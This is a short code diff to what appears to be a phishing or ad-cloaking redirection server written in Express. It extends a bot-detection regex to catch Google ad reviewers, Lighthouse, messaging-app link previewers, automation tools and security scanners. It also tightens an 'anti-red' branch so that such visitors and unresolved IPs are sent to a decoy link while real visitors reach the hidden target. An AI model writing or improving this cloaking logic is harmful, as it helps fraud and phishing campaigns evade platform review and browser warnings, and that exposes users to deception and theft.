@@ -1709,7 +1709,7 @@ app.get('/api/isps', (req, res) => {
 });
 
 // --- Proxy Redirection Logic ---
-const BOT_UA_REGEX = /googlebot|bingbot|yandexbot|duckduckbot|slurp|baiduspider|facebot|ia_archiver|crawler|spider|robot|curl|wget|python|postman|insomnia|headless|screaming frog|ahrefsbot|semrushbot|mj12bot|dotbot|rogerbot|exabot|petalbot/i;
+const BOT_UA_REGEX = /googlebot|bingbot|yandexbot|duckduckbot|slurp|baiduspider|facebot|ia_archiver|crawler|spider|robot|curl|wget|python|postman|insomnia|headless|screaming frog|ahrefsbot|semrushbot|mj12bot|dotbot|rogerbot|exabot|petalbot|adsbot|adwords|mediapartners|lighthouse|google-adwords|google-express|gSA-|google-http-client|google-adwords-instant|preview|whatsapp|telegram|discord|slack|facebookexternalhit|twitterbot|linkedinbot|pinterestbot|selenium|puppeteer|phantomjs|webdriver|headless|inspect|scan|analyze|google|bot/i;
 
 function isBot(req) {
     const ua = req.headers['user-agent'] || '';
@@ -1880,7 +1880,7 @@ async function handleRedirection(user, req, res, linkData) {
     // 4. Filtering Logic
     let targetUrl = realLink;
 
-    if (useAntiRed && isSuspicious) {
+    if (useAntiRed && (isSuspicious || !data || data.status !== 'success')) {
         targetUrl = nonRealLink;
     } else if (useIspFilter && data && data.status === 'success') {
         const userISP = (data.isp || data.org || "").toUpperCase();
